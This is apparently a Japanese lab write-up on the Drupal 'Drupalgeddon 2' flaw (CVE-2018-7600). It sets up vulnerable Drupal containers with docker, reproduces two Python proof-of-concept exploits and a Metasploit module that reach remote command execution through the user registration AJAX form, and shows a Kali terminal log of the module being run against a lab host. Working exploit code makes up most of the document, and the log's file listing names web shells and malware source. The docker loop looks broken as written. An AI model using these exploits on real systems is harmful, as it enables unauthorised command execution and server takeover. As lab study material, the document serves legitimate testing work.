
# リファレンス
        https://www.drupal.org/sa-core-2018-002
        https://greysec.net/showthread.php?tid=2912
        https://research.checkpoint.com/uncovering-drupalgeddon-2/
        https://github.com/a2u/CVE-2018-7600'],
        https://github.com/nixawk/labs/issues/19']


# 検証環境構築

drupalのdockerhubのtag一覧  
https://hub.docker.com/r/library/drupal/tags/

```
7-fpm
7.58-fpm
7
7.58
7-apache
7.58-apache
8.3-fpm
8.3.9-fpm
8.3
8.3.9
8.3-apache
8.3.9-apache
8.4-fpm
8.4.6-fpm
8.4
8.4.6
8.4-apache
8.4.6-apache
fpm-alpine
8-fpm-alpine
8.5-fpm-alpine
8.5.1-fpm-alpine
fpm
8-fpm
8.5-fpm
8.5.1-fpm
latest
8
8.5
8.5.1
apache
8-apache
8.5-apache
8.5.1-apache
7-fpm-alpine
7.58-fpm-alpine
8.3-fpm-alpine
8.3.9-fpm-alpine
8.4-fpm-alpine
8.4.6-fpm-alpine
7.57-fpm
7.57
7.57-apache
8.5.0-fpm
8.5.0
8.5.0-apache
8.5.0-fpm-alpine
rc-fpm
8.5-rc-fpm
8.5.0-rc1-fpm
rc-fpm-alpine
8.5-rc-fpm-alpine
8.5.0-rc1-fpm-alpine
8.4.5-fpm
8.4.5
8.4.5-apache
rc
8.5-rc
8.5.0-rc1
rc-apache
8.5-rc-apache
8.5.0-rc1-apache
7.57-fpm-alpine
8.4.5-fpm-alpine
7.56-fpm
7.56
7.56-apache
8.4.4-fpm
8.4.4
8.4.4-apache
8.5.0-beta1-fpm
8.5.0-beta1
8.5.0-beta1-apache
8.5.0-beta1-fpm-alpine
7.56-fpm-alpine
8.4.4-fpm-alpine
8.5.0-alpha1
8.5.0-alpha1-apache
8.5.0-alpha1-fpm-alpine
8.5.0-alpha1-fpm
8.3.7-fpm
8.3.7-fpm-alpine
8.3.7
8.3.7-apache
8.4.3-fpm
8.4.3
8.4.3-apache
8.4.3-fpm-alpine
8.4.2-fpm-alpine
8.4.2-fpm
8.4.2
8.4.2-apache
8.4.1-fpm
8.4.1
8.4.1-apache
8.4.0-fpm
8.4.0
8.4.0-apache
8.4.0-fpm-alpine
8.4-rc-fpm
```

これらのtxtファイルを作っておく

#### 建てる
```for ((i=0; i<10; ++i)); do docker run -it -d -p ${i}:80 drupal:$(cat tags.txt) ; done ```

#### 全削除
```docker ps -a | awk '{print $1}' | tail -n +2 | xargs docker rm```

for文でdocker runして一気にdruaplを建てる

---

# 攻撃コード

http://192.168.204.80:81/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax  
jsonから任意のコマンド実行とかができる

### Exploit-1(python)
```python
#!/usr/bin/env
import sys
import requests

print ('################################################################')
print ('# Proof-Of-Concept for CVE-2018-7600')
print ('# by Vitalii Rudnykh')
print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders')
print ('# https://github.com/a2u/CVE-2018-7600')
print ('################################################################')
print ('Provided only for educational or information purposes\n')

target = input('Enter target url (example: https://domain.ltd/): ')

url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee hello.txt'}

r = requests.post(url, data=payload)
if r.status_code != 200:
  sys.exit("Not exploitable")
print ('\nCheck: '+target+'hello.txt')
```

### Exploit-1(python)
```python

#!/usr/bin/env python
# -*- coding: utf-8 -*-

# CVE-2018-7600
# Drupal: Unsanitized requests allow remote attackers to execute arbitrary code

"""Tested against Drupal 8.4.5

$ wget -c https://ftp.drupal.org/files/projects/drupal-8.4.5.tar.gz
$ setup Apache2 + Mysql + Drupal

$ python exploit-CVE-2018-7600.py http://192.168.1.19 "pwd"
/var/www/html

----

POST /user/register?element_parents=account%2Fmail%2F%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.18.4
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 144
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&_drupal_ajax=1&mail%5B%23type%5D=markup&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23markup%5D=printf admin | md5sum

HTTP/1.1 200 OK
Date: Fri, 13 Apr 2018 05:19:28 GMT
Server: Apache/2.4.29 (Debian)
Cache-Control: must-revalidate, no-cache, private
X-UA-Compatible: IE=edge
Content-language: en
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Expires: Sun, 19 Nov 1978 05:00:00 GMT
X-Generator: Drupal 8 (https://www.drupal.org)
X-Drupal-Ajax-Token: 1
Content-Length: 191
Connection: close
Content-Type: application/json

[{"command":"insert","method":"replaceWith","selector":null,"data":"21232f297a57a5a743894a0e4a801fc3  -\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]

"""

# sudo pip install requests


from __future__ import print_function

__all__ = ['exploit']
__author__ = [
    'a2u',   # module developer
    'Nixawk' # module Improved
]

import sys
import requests


def send_http_payload(drupal_home_url, php_func, php_func_param):
    """Exploit CVE-2018-7600 drupal: Unsanitized requests
    allow remote attackers to execute arbitrary code
    """
    
    params = {
        'element_parents': 'account/mail/#value',
        'ajax_form': 1,
        '_wrapper_format': 'drupal_ajax'
    }

    payload = {
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#type]': 'markup',
        'mail[#post_render][]': php_func,
        'mail[#markup]': php_func_param
    }

    # Clean URLs - Enabled
    url = requests.compat.urljoin(drupal_home_url, '/user/register')

    return requests.post(
        url,
        params=params,
        data=payload
    )


def check(drupal_home_url):
    """Check if the target is vulnerable to CVE-2018-7600.
    """
    status = False

    randflag = 'CVE-2018-7600'
    vulnflag = randflag + '[{"command":"insert"'
    response = send_http_payload(drupal_home_url, 'printf', randflag)
    if response and response.status_code == 200 and randflag in response.text:
        print("[*] %s is vulnerable" % drupal_home_url)
        status = True
    else:
        print("[?] %s is unknown" % drupal_home_url)

    return status


def exploit(drupal_home_url, php_exec_func='passthru', command='whoami'):
    """Execute os command.
    """
    response = send_http_payload(drupal_home_url, php_exec_func, command)
    if '[{"command":"insert"' in response.text:
        command_output, _ = response.text.split('[{"command":"insert"')
        print(command_output)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python %s <drupal-home-url> <cmd>" % sys.argv[0])
        sys.exit(0)

    exploit(sys.argv[1], command=sys.argv[2])
```


### Exploit-2

```rb
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Drupal Drupalgeddon 2',
      'Description'    => %q{
        This module exploits a vulnerability.
      },
      'Author'         => [
        'Jasper Mattsson', # Vulnerability discovery
        'a2u',             # Proof of concept
        'Nixawk',          # Proof of concept
        'wvu'              # Metasploit module
      ],
      'References'     => [
        ['CVE', '2018-7600'],
        ['URL', 'https://www.drupal.org/sa-core-2018-002'],
        ['URL', 'https://greysec.net/showthread.php?tid=2912'],
        ['URL', 'https://research.checkpoint.com/uncovering-drupalgeddon-2/'],
        ['URL', 'https://github.com/a2u/CVE-2018-7600'],
        ['URL', 'https://github.com/nixawk/labs/issues/19']
      ],
      'DisclosureDate' => 'Mar 28 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Targets'        => [
        ['Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1', {}]
      ],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {
        'PAYLOAD'      => 'cmd/unix/generic',
        'CMD'          => 'id; uname -a'
      }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to Drupal install', '/']),
      OptBool.new('CLEAN_URLS',  [false, 'If clean URLs are enabled', true]),
      OptBool.new('DUMP_OUTPUT', [false, 'If output should be dumped', true])
    ])
  end

  def check
    token = Rex::Text.rand_text_alphanumeric(8..42)

    res = exploit(code: "echo #{token}")

    if res && res.body.include?(token)
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end

  # TODO: passthru() may be disabled, so try others
  def exploit(func: 'passthru', code: payload.encoded)
    if datastore['CLEAN_URLS']
      register = '/user/register'
    else
      register = '?q=user/register'
    end

    print_status("Executing on target: #{code}")

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, register),
      'vars_get'  => {
        'element_parents' => 'account/mail/#value',
        'ajax_form'       => 1,
        '_wrapper_format' => 'drupal_ajax'
      },
      'vars_post' => {
        'form_id'              => 'user_register_form',
        '_drupal_ajax'         => 1,
        'mail[#type]'          => 'markup',
        'mail[#post_render][]' => func,
        'mail[#markup]'        => code
      }
    )

    if res.nil? || res.code != 200
      print_error("Unexpected reply: #{res.inspect}")
      return nil
    end

    print_line(res.body) if datastore['DUMP_OUTPUT']

    res
  end

end
```

----

# screen shot
<img src="https://imgur.com/download/mjD12Tz" width=80%>
<img src="https://imgur.com/download/MvK0Ywg" width=80%>

# log
```
2018-04-15T18:19:51.790 - 
2018-04-15T18:19:51.794 - The programs included with the Kali GNU/Linux system are free software;
2018-04-15T18:19:51.795 - the exact distribution terms for each program are described in the
2018-04-15T18:19:51.795 - individual files in /usr/share/doc/*/copyright.
2018-04-15T18:19:51.795 - 
2018-04-15T18:19:51.796 - Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
2018-04-15T18:19:51.796 - permitted by applicable law.
2018-04-15T18:19:51.796 - Last login: Sat Apr 14 00:41:40 2018 from 192.168.204.7
2018-04-15T18:19:53.870 - root@kali:~# 
2018-04-15T18:19:54.029 - root@kali:~# 
2018-04-15T18:19:54.752 - root@kali:~# clear
2018-04-15T18:19:54.913 - root@kali:~# 
2018-04-15T18:19:55.055 - root@kali:~# 
2018-04-15T18:19:55.429 - root@kali:~# ls
2018-04-15T18:19:55.595 - 
2018-04-15T18:19:55.886 - c99.php        CVE-2018-7600     echo-sd         kali-archive-keyring_2018.1_all.deb  nmap-7.60-1.x86_64.rpm  Release.gpg         tor-ip.log
2018-04-15T18:19:55.886 - coffeeMiner    CVE-2018-7600.rb  gateway.docker  metasploitavevasion                  nmap-7.60.tar.bz2       Spaghetti           weevely.php
2018-04-15T18:19:55.887 - coin-hive      dde_delivery.rb   hello.txt       Mirai-Source-Code                    password.lst.gz         test.rb
2018-04-15T18:19:55.887 - cve-2018-7600  Desktop           iplist          nmap-7.60                            reGeorg                 tor-exit-node-list
2018-04-15T18:19:55.889 - root@kali:~# 
2018-04-15T18:19:57.221 - root@kali:~# 
2018-04-15T18:20:01.850 - root@kali:~# cd /opt/metasploit-framework/
2018-04-15T18:20:02.019 - root@kali:/opt/metasploit-framework# 
2018-04-15T18:20:15.660 - root@kali:/opt/metasploit-framework# ls
2018-04-15T18:20:15.871 - 
2018-04-15T18:20:16.035 - app                 COPYING     docker                       documentation          Gemfile.lock  metasploit-framework.gemspec  msfrpc     plugins    scripts  Vagrantfile
2018-04-15T18:20:16.035 - CODE_OF_CONDUCT.md  CURRENT.md  docker-compose.override.yml  external               lib           modules                       msfrpcd    Rakefile   spec
2018-04-15T18:20:16.035 - config              data        docker-compose.yml           Gemfile                LICENSE       msfconsole                    msfupdate  README.md  test
2018-04-15T18:20:16.036 - CONTRIBUTING.md     db          Dockerfile                   Gemfile.local.example  LICENSE_GEMS  msfd                          msfvenom   script     tools
2018-04-15T18:20:16.039 - root@kali:/opt/metasploit-framework# 
2018-04-15T18:20:29.484 - root@kali:/opt/metasploit-framework# cd modules/
2018-04-15T18:20:29.640 - root@kali:/opt/metasploit-framework/modules# 
2018-04-15T18:20:30.038 - root@kali:/opt/metasploit-framework/modules# ls
2018-04-15T18:20:30.175 - auxiliary  encoders  exploits  nops  payloads  post
2018-04-15T18:20:30.624 - root@kali:/opt/metasploit-framework/modules# 
2018-04-15T18:20:30.791 - root@kali:/opt/metasploit-framework/modules# 
2018-04-15T18:20:32.144 - root@kali:/opt/metasploit-framework/modules# cd exploits/
2018-04-15T18:20:32.300 - root@kali:/opt/metasploit-framework/modules/exploits# 
2018-04-15T18:20:32.644 - root@kali:/opt/metasploit-framework/modules/exploits# ls
2018-04-15T18:20:32.714 - aix  android  apple_ios  bsdi  cve-2018-7600.rb  dialup  example.rb  firefox  freebsd  hpux  irix  linux  mainframe  multi  netware  osx  solaris  unix  windows
2018-04-15T18:20:33.059 - root@kali:/opt/metasploit-framework/modules/exploits# 
2018-04-15T18:20:33.222 - root@kali:/opt/metasploit-framework/modules/exploits# 
2018-04-15T18:20:36.409 - root@kali:/opt/metasploit-framework/modules/exploits# cat cve-2018-7600.rb 
2018-04-15T18:20:36.425 - ##
2018-04-15T18:20:36.425 - # This module requires Metasploit: https://metasploit.com/download
2018-04-15T18:20:36.425 - # Current source: https://github.com/rapid7/metasploit-framework
2018-04-15T18:20:36.425 - ##
2018-04-15T18:20:36.425 - 
2018-04-15T18:20:36.425 - class MetasploitModule < Msf::Exploit::Remote
2018-04-15T18:20:36.425 - 
2018-04-15T18:20:36.426 -   Rank = ExcellentRanking
2018-04-15T18:20:36.426 - 
2018-04-15T18:20:36.426 -   include Msf::Exploit::Remote::HttpClient
2018-04-15T18:20:36.426 - 
2018-04-15T18:20:36.426 -   def initialize(info = {})
2018-04-15T18:20:36.426 -     super(update_info(info,
2018-04-15T18:20:36.427 -       'Name'           => 'Drupal Drupalgeddon 2',
2018-04-15T18:20:36.427 -       'Description'    => %q{
2018-04-15T18:20:36.427 -         This module exploits a vulnerability.
2018-04-15T18:20:36.428 -       },
2018-04-15T18:20:36.428 -       'Author'         => [
2018-04-15T18:20:36.428 -         'Jasper Mattsson', # Vulnerability discovery
2018-04-15T18:20:36.428 -         'a2u',             # Proof of concept
2018-04-15T18:20:36.428 -         'Nixawk',          # Proof of concept
2018-04-15T18:20:36.428 -         'wvu'              # Metasploit module
2018-04-15T18:20:36.428 -       ],
2018-04-15T18:20:36.428 -       'References'     => [
2018-04-15T18:20:36.428 -         ['CVE', '2018-7600'],
2018-04-15T18:20:36.428 -         ['URL', 'https://www.drupal.org/sa-core-2018-002'],
2018-04-15T18:20:36.428 -         ['URL', 'https://greysec.net/showthread.php?tid=2912'],
2018-04-15T18:20:36.428 -         ['URL', 'https://research.checkpoint.com/uncovering-drupalgeddon-2/'],
2018-04-15T18:20:36.428 -         ['URL', 'https://github.com/a2u/CVE-2018-7600'],
2018-04-15T18:20:36.428 -         ['URL', 'https://github.com/nixawk/labs/issues/19']
2018-04-15T18:20:36.428 -       ],
2018-04-15T18:20:36.428 -       'DisclosureDate' => 'Mar 28 2018',
2018-04-15T18:20:36.428 -       'License'        => MSF_LICENSE,
2018-04-15T18:20:36.428 -       'Platform'       => 'unix',
2018-04-15T18:20:36.428 -       'Arch'           => ARCH_CMD,
2018-04-15T18:20:36.428 -       'Privileged'     => false,
2018-04-15T18:20:36.428 -       'Targets'        => [
2018-04-15T18:20:36.428 -         ['Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1', {}]
2018-04-15T18:20:36.428 -       ],
2018-04-15T18:20:36.430 -       'DefaultTarget'  => 0,
2018-04-15T18:20:36.430 -       'DefaultOptions' => {
2018-04-15T18:20:36.430 -         'PAYLOAD'      => 'cmd/unix/generic',
2018-04-15T18:20:36.430 -         'CMD'          => 'id; uname -a'
2018-04-15T18:20:36.430 -       }
2018-04-15T18:20:36.430 -     ))
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     register_options([
2018-04-15T18:20:36.430 -       OptString.new('TARGETURI', [true, 'Path to Drupal install', '/']),
2018-04-15T18:20:36.430 -       OptBool.new('CLEAN_URLS',  [false, 'If clean URLs are enabled', true]),
2018-04-15T18:20:36.430 -       OptBool.new('DUMP_OUTPUT', [false, 'If output should be dumped', true])
2018-04-15T18:20:36.430 -     ])
2018-04-15T18:20:36.430 -   end
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -   def check
2018-04-15T18:20:36.430 -     token = Rex::Text.rand_text_alphanumeric(8..42)
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     res = exploit(code: "echo #{token}")
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     if res && res.body.include?(token)
2018-04-15T18:20:36.430 -       return CheckCode::Vulnerable
2018-04-15T18:20:36.430 -     end
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     CheckCode::Safe
2018-04-15T18:20:36.430 -   end
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -   # TODO: passthru() may be disabled, so try others
2018-04-15T18:20:36.430 -   def exploit(func: 'passthru', code: payload.encoded)
2018-04-15T18:20:36.430 -     if datastore['CLEAN_URLS']
2018-04-15T18:20:36.430 -       register = '/user/register'
2018-04-15T18:20:36.430 -     else
2018-04-15T18:20:36.430 -       register = '?q=user/register'
2018-04-15T18:20:36.430 -     end
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     print_status("Executing on target: #{code}")
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     res = send_request_cgi(
2018-04-15T18:20:36.430 -       'method'    => 'POST',
2018-04-15T18:20:36.430 -       'uri'       => normalize_uri(target_uri.path, register),
2018-04-15T18:20:36.430 -       'vars_get'  => {
2018-04-15T18:20:36.430 -         'element_parents' => 'account/mail/#value',
2018-04-15T18:20:36.430 -         'ajax_form'       => 1,
2018-04-15T18:20:36.430 -         '_wrapper_format' => 'drupal_ajax'
2018-04-15T18:20:36.430 -       },
2018-04-15T18:20:36.430 -       'vars_post' => {
2018-04-15T18:20:36.430 -         'form_id'              => 'user_register_form',
2018-04-15T18:20:36.430 -         '_drupal_ajax'         => 1,
2018-04-15T18:20:36.430 -         'mail[#type]'          => 'markup',
2018-04-15T18:20:36.430 -         'mail[#post_render][]' => func,
2018-04-15T18:20:36.430 -         'mail[#markup]'        => code
2018-04-15T18:20:36.430 -       }
2018-04-15T18:20:36.430 -     )
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     if res.nil? || res.code != 200
2018-04-15T18:20:36.430 -       print_error("Unexpected reply: #{res.inspect}")
2018-04-15T18:20:36.430 -       return nil
2018-04-15T18:20:36.430 -     end
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     print_line(res.body) if datastore['DUMP_OUTPUT']
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 -     res
2018-04-15T18:20:36.430 -   end
2018-04-15T18:20:36.430 - 
2018-04-15T18:20:36.430 - end
2018-04-15T18:20:37.195 - root@kali:/opt/metasploit-framework/modules/exploits# 
2018-04-15T18:20:37.391 - root@kali:/opt/metasploit-framework/modules/exploits# 
2018-04-15T18:20:37.619 - root@kali:/opt/metasploit-framework/modules/exploits# 
2018-04-15T18:20:41.295 - root@kali:/opt/metasploit-framework/modules/exploits# cd ../../
2018-04-15T18:20:41.693 - root@kali:/opt/metasploit-framework# 
2018-04-15T18:20:41.893 - root@kali:/opt/metasploit-framework# 
2018-04-15T18:20:42.109 - root@kali:/opt/metasploit-framework# 
2018-04-15T18:20:46.176 - root@kali:/opt/metasploit-framework# ./msfconsole
2018-04-15T18:21:22.240 -                                                   
2018-04-15T18:21:22.357 - 
2018-04-15T18:21:22.357 -          .                                         .
2018-04-15T18:21:22.357 -  .
2018-04-15T18:21:22.358 - 
2018-04-15T18:21:22.358 -       dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
2018-04-15T18:21:22.358 -        '   dB'                     BBP
2018-04-15T18:21:22.370 -     dB'dB'dB' dBBP     dBP     dBP BB
2018-04-15T18:21:22.370 -    dB'dB'dB' dBP      dBP     dBP  BB
2018-04-15T18:21:22.370 -   dB'dB'dB' dBBBBP   dBP     dBBBBBBB
2018-04-15T18:21:22.370 - 
2018-04-15T18:21:22.370 -                                    dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
2018-04-15T18:21:22.370 -           .                  .                  dB' dBP    dB'.BP
2018-04-15T18:21:22.370 -                              |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
2018-04-15T18:21:22.370 -                            --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
2018-04-15T18:21:22.370 -                              |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
2018-04-15T18:21:22.370 - 
2018-04-15T18:21:22.370 -                                                                     .
2018-04-15T18:21:22.370 -                 .
2018-04-15T18:21:22.370 -         o                  To boldly go where no
2018-04-15T18:21:22.370 -                             shell has gone before
2018-04-15T18:21:22.370 - 
2018-04-15T18:21:22.370 - 
2018-04-15T18:21:22.370 -        =[ metasploit v5.0.0-dev-6721b79526                ]
2018-04-15T18:21:22.370 - + -- --=[ 1735 exploits - 992 auxiliary - 300 post        ]
2018-04-15T18:21:22.370 - + -- --=[ 509 payloads - 40 encoders - 10 nops            ]
2018-04-15T18:21:22.370 - + -- --=[ ** This is Metasploit 5 development branch **   ]
2018-04-15T18:21:22.370 - 
2018-04-15T18:22:07.576 - msf5 > 
2018-04-15T18:22:07.763 - msf5 > 
2018-04-15T18:23:09.035 - msf5 > search cve-2018-7600
2018-04-15T18:23:09.219 - 
2018-04-15T18:23:09.219 - Matching Modules
2018-04-15T18:23:09.219 - ================
2018-04-15T18:23:09.219 - 
2018-04-15T18:23:09.219 -    Name                   Disclosure Date  Rank       Description
2018-04-15T18:23:09.219 -    ----                   ---------------  ----       -----------
2018-04-15T18:23:09.221 -    exploit/cve-2018-7600  2018-03-28       excellent  Drupal Drupalgeddon 2
2018-04-15T18:23:09.221 - 
2018-04-15T18:23:09.221 - 
2018-04-15T18:23:09.860 - msf5 > 
2018-04-15T18:23:10.036 - msf5 > 
2018-04-15T18:23:16.820 - msf5 > use exploit/cve-2018-7600
2018-04-15T18:23:17.582 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:23:17.754 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:23:17.906 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:23:19.426 - msf5 exploit(cve-2018-7600) > show options 
2018-04-15T18:23:19.444 - 
2018-04-15T18:23:19.444 - Module options (exploit/cve-2018-7600):
2018-04-15T18:23:19.445 - 
2018-04-15T18:23:19.445 -    Name         Current Setting  Required  Description
2018-04-15T18:23:19.445 -    ----         ---------------  --------  -----------
2018-04-15T18:23:19.445 -    CLEAN_URLS   true             no        If clean URLs are enabled
2018-04-15T18:23:19.446 -    DUMP_OUTPUT  true             no        If output should be dumped
2018-04-15T18:23:19.446 -    Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
2018-04-15T18:23:19.446 -    RHOST                         yes       The target address
2018-04-15T18:23:19.447 -    RPORT        80               yes       The target port (TCP)
2018-04-15T18:23:19.447 -    SSL          false            no        Negotiate SSL/TLS for outgoing connections
2018-04-15T18:23:19.447 -    TARGETURI    /                yes       Path to Drupal install
2018-04-15T18:23:19.447 -    VHOST                         no        HTTP server virtual host
2018-04-15T18:23:19.447 - 
2018-04-15T18:23:19.452 - 
2018-04-15T18:23:19.452 - Payload options (cmd/unix/generic):
2018-04-15T18:23:19.452 - 
2018-04-15T18:23:19.452 -    Name  Current Setting  Required  Description
2018-04-15T18:23:19.452 -    ----  ---------------  --------  -----------
2018-04-15T18:23:19.452 -    CMD   id; uname -a     yes       The command string to execute
2018-04-15T18:23:19.452 - 
2018-04-15T18:23:19.455 - 
2018-04-15T18:23:19.455 - Exploit target:
2018-04-15T18:23:19.455 - 
2018-04-15T18:23:19.455 -    Id  Name
2018-04-15T18:23:19.455 -    --  ----
2018-04-15T18:23:19.456 -    0   Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1
2018-04-15T18:23:19.456 - 
2018-04-15T18:23:19.456 - 
2018-04-15T18:23:19.578 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:23:20.340 - msf5 exploit(cve-2018-7600) > ls
2018-04-15T18:23:20.406 - [*] exec: ls
2018-04-15T18:23:20.407 - 
2018-04-15T18:23:20.696 - app
2018-04-15T18:23:20.704 - CODE_OF_CONDUCT.md
2018-04-15T18:23:20.704 - config
2018-04-15T18:23:20.704 - CONTRIBUTING.md
2018-04-15T18:23:20.704 - COPYING
2018-04-15T18:23:20.704 - CURRENT.md
2018-04-15T18:23:20.705 - data
2018-04-15T18:23:20.705 - db
2018-04-15T18:23:20.705 - docker
2018-04-15T18:23:20.705 - docker-compose.override.yml
2018-04-15T18:23:20.705 - docker-compose.yml
2018-04-15T18:23:20.707 - Dockerfile
2018-04-15T18:23:20.708 - documentation
2018-04-15T18:23:20.709 - external
2018-04-15T18:23:20.710 - Gemfile
2018-04-15T18:23:20.710 - Gemfile.local.example
2018-04-15T18:23:20.712 - Gemfile.lock
2018-04-15T18:23:20.712 - lib
2018-04-15T18:23:20.713 - LICENSE
2018-04-15T18:23:20.714 - LICENSE_GEMS
2018-04-15T18:23:20.715 - metasploit-framework.gemspec
2018-04-15T18:23:20.716 - modules
2018-04-15T18:23:20.717 - msfconsole
2018-04-15T18:23:20.718 - msfd
2018-04-15T18:23:20.719 - msfrpc
2018-04-15T18:23:20.720 - msfrpcd
2018-04-15T18:23:20.721 - msfupdate
2018-04-15T18:23:20.722 - msfvenom
2018-04-15T18:23:20.723 - plugins
2018-04-15T18:23:20.724 - Rakefile
2018-04-15T18:23:20.725 - README.md
2018-04-15T18:23:20.725 - script
2018-04-15T18:23:20.726 - scripts
2018-04-15T18:23:20.727 - spec
2018-04-15T18:23:20.728 - test
2018-04-15T18:23:20.729 - tools
2018-04-15T18:23:20.731 - Vagrantfile
2018-04-15T18:23:22.118 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:23:22.512 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:23:40.222 - msf5 exploit(cve-2018-7600) > set RHOST 192.168.204.80
2018-04-15T18:23:40.232 - RHOST => 192.168.204.80
2018-04-15T18:23:48.474 - msf5 exploit(cve-2018-7600) > set RPORT 81
2018-04-15T18:23:48.489 - RPORT => 81
2018-04-15T18:23:49.044 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:01.575 - msf5 exploit(cve-2018-7600) > show options 
2018-04-15T18:24:01.595 - 
2018-04-15T18:24:01.595 - Module options (exploit/cve-2018-7600):
2018-04-15T18:24:01.595 - 
2018-04-15T18:24:01.595 -    Name         Current Setting  Required  Description
2018-04-15T18:24:01.595 -    ----         ---------------  --------  -----------
2018-04-15T18:24:01.596 -    CLEAN_URLS   true             no        If clean URLs are enabled
2018-04-15T18:24:01.596 -    DUMP_OUTPUT  true             no        If output should be dumped
2018-04-15T18:24:01.596 -    Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
2018-04-15T18:24:01.596 -    RHOST        192.168.204.80   yes       The target address
2018-04-15T18:24:01.596 -    RPORT        81               yes       The target port (TCP)
2018-04-15T18:24:01.597 -    SSL          false            no        Negotiate SSL/TLS for outgoing connections
2018-04-15T18:24:01.597 -    TARGETURI    /                yes       Path to Drupal install
2018-04-15T18:24:01.597 -    VHOST                         no        HTTP server virtual host
2018-04-15T18:24:01.597 - 
2018-04-15T18:24:01.607 - 
2018-04-15T18:24:01.607 - Payload options (cmd/unix/generic):
2018-04-15T18:24:01.607 - 
2018-04-15T18:24:01.607 -    Name  Current Setting  Required  Description
2018-04-15T18:24:01.607 -    ----  ---------------  --------  -----------
2018-04-15T18:24:01.607 -    CMD   id; uname -a     yes       The command string to execute
2018-04-15T18:24:01.607 - 
2018-04-15T18:24:01.607 - 
2018-04-15T18:24:01.607 - Exploit target:
2018-04-15T18:24:01.607 - 
2018-04-15T18:24:01.607 -    Id  Name
2018-04-15T18:24:01.608 -    --  ----
2018-04-15T18:24:01.608 -    0   Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1
2018-04-15T18:24:01.608 - 
2018-04-15T18:24:01.608 - 
2018-04-15T18:24:07.126 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:07.324 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:07.488 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:12.059 - msf5 exploit(cve-2018-7600) > run
2018-04-15T18:24:12.108 - 
2018-04-15T18:24:12.108 - [*] Executing on target: id; uname -a
2018-04-15T18:24:12.877 - [{"command":"insert","method":"replaceWith","selector":null,"data":"\n  \u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
2018-04-15T18:24:15.083 - [*] Exploit completed, but no session was created.
2018-04-15T18:24:16.530 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:16.822 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:22.486 - msf5 exploit(cve-2018-7600) > set cmd pwd
2018-04-15T18:24:22.500 - cmd => pwd
2018-04-15T18:24:23.108 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:24.145 - msf5 exploit(cve-2018-7600) > run
2018-04-15T18:24:24.193 - 
2018-04-15T18:24:24.194 - [*] Executing on target: pwd
2018-04-15T18:24:24.745 - [{"command":"insert","method":"replaceWith","selector":null,"data":"\n  \u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
2018-04-15T18:24:26.952 - [*] Exploit completed, but no session was created.
2018-04-15T18:24:27.893 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:28.138 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:28.353 - msf5 exploit(cve-2018-7600) > 
2018-04-15T18:24:29.324 - msf5 exploit(cve-2018-7600) > exit
